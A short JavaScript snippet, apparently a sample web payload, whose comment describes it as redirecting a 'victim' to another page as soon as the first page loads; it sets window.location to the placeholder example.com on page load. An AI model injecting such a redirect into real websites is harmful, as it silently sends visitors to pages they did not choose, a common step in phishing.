// Script that will redirect victim to a new page when the first page
// loads

<script type="text/javascript">
window.onload=function() {
	redirect();
}

function redirect(){
  window.location = "http://example.com";
}
</script>
